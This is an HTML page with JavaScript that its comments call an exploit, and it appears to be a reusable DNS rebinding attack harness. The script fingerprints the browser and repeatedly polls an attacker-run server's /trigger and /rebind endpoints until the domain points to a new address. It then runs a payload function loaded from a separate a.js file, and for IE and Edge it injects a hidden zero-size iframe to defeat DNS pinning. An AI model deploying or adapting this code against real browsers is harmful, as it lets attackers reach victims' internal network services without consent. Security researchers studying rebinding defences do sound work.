<html>
<!--
The basic exploit that should work in any scenario, the payload to execute after
domain has changed should be placed in a separate js-file. The separate JS-file
should have a function called 'exploitStart()' which will be called when DNS
entry has changed.
-->
<head>
<!-- The exploit file is always called a.js -->
<script src="a.js"></script>
</head>
<body>
<div id="inject"></div>
<script>
// URL decode and also decode '+' to space
function urldecode(url) {
  return decodeURIComponent(url.replace(/\+/g, ' '));
}

/**
 * Browser detection from:
 * https://stackoverflow.com/questions/9847580/how-to-detect-safari-chrome-ie-firefox-and-opera-browser
 */
var browser = function() {
    // Return cached result if avalible, else get result then cache it.
    if (browser.prototype._cachedResult)
        return browser.prototype._cachedResult;

    // Opera 8.0+
    var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

    // Firefox 1.0+
    var isFirefox = typeof InstallTrigger !== 'undefined';

    // Safari 3.0+ "[object HTMLElementConstructor]" 
    var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || safari.pushNotification);

    // Internet Explorer 6-11
    var isIE = /*@cc_on!@*/false || !!document.documentMode;

    // Edge 20+
    var isEdge = !isIE && !!window.StyleMedia;

    // Chrome 1+
    var isChrome = !!window.chrome && !!window.chrome.webstore;

    // Blink engine detection
    var isBlink = (isChrome || isOpera) && !!window.CSS;

    return browser.prototype._cachedResult =
        isOpera ? 'Opera' :
        isFirefox ? 'Firefox' :
        isSafari ? 'Safari' :
        isChrome ? 'Chrome' :
        isIE ? 'IE' :
        isEdge ? 'Edge' :
        "Don't know";
};


// Get current domain name
function target_URL()  {
	return window.location.protocol + "//" + document.domain + ":" + window.location.port;
}

// Helper to send HTTP requests
function sendReq(method, url, data, cb)	{
	var xhr = new XMLHttpRequest();
	xhr.open(method, url, true);
	xhr.timeout = 5000;	// Timeout in milliseconds
	xhr.onreadystatechange = function()	{
		if (xhr.readyState == xhr.DONE) {
			if(cb != null)	cb(xhr);
		}
	};
	xhr.send(data);
}

var rootDomain = undefined;	// Will try and detect it dynamically if set to undefined
var sent = 0;				// How many requests have been sent
var max_send = 60;			// Number of requests to send before we give up
var wait_each = 5 * 1000;	// Waiting period between each request

function sendEach(xhr)	{
	console.log(xhr);
	if(sent < max_send)	{
		// The real server should always return HTTP 200
		if(xhr != null)	{
			if(xhr.status != 200)	{
				console.log("Got non-200 response");
				exploitStart();
				return;
			}
			else if(xhr.response != "OK")	{
				console.log("Got unexpected text response");
				exploitStart();
				return;
			}
		}
		sent += 1;
		console.log("Started new timeout: " + sent);
		setTimeout(function () { sendReq("GET", url + "/rebind?browser=" + browser() + "&delay=" + (sent*(wait_each/1000)), null, sendEach); }, wait_each);
	}
	else	{
		console.log("All done");
	}
	return;
}

function triggered(xhr)	{
	console.log("Sent trigger domain: " + document.domain);
	
	// If xhr is null or a non-200 code was returned, we were not successfull,
	// potentially because we are at the wrong IP
	if(xhr == null || xhr.status != 200)	{
		console.log("Failed to trigger on domain");
		return;
	}

	if(browser() == "IE" || browser() == "Edge")	{
		// Insert so that the browser knows the IP is "down"
		var img = "<img src='" + target_URL() + "/test.png'>";
		document.getElementById("inject").innerHTML = img;
		
		// If we are on IE or Edge we trigger new IP more quickly
		wait_each = 1 * 1000;
		sendReq("GET", url + "/rebind?browser=" + browser() + "&delay=0", null, sendEach);
	}
	else	{
		// Start making requests	
		sendEach(null);
	}
}


var url = target_URL();

/**
* Because of the long DNS pinning in IE and Edge, they are handled a bit differently.
* A new iframe is inserted to a second domain that has domain entry to both domains
*/
if(browser() == "IE" || browser() == "Edge")	{
	console.log("Detected IE");
	var domain = document.domain;

	/**
	* Assumes that first domain name is: [random].a.[root domain]
	* Assumes second domain name is: [random].b.[root domain]
	*/
	var ind = domain.indexOf(".b.");
	if(ind > 0)	{
		// Asks the web server to block this IP for 60 seconds
		sendReq("GET", url + "/trigger?block=true&time=60", null, triggered);
	}
	else	{
		if(rootDomain == undefined)	{
			// Assumes everything after the ".a." separater is the root domain that should be used
			var ind2 = domain.indexOf(".a.");
			rootDomain = domain.substring(ind2 + 3);
		}
		var iframe = '<iframe width="0" height="0" src="http://' + rootDomain + '/redirect?sub=b" frameborder="0"></iframe>';
		document.getElementById("inject").innerHTML = iframe;
	}
}
else	{
	sendReq("GET", url + "/trigger", null, triggered);
}
</script>
</body>
</html>

